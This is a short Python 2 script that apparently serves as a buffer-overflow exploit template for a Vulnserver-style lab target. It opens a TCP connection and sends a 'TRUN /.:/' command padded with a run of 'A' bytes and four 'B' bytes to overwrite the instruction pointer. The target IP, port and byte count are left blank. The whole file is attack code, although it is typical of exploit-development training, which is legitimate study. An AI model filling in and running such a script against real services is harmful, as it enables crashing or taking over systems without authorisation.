#! /usr/bin/python

import sys, socket 

# Enter the no of bytes 

no_of_bytes = 

shellcode = "A" * no_of_bytes + "B" * 4
try:

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('' , '')) # windows ip and port to be given in 

	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:

	print "Eroor connecting to the server "	
	sys.exit()

		

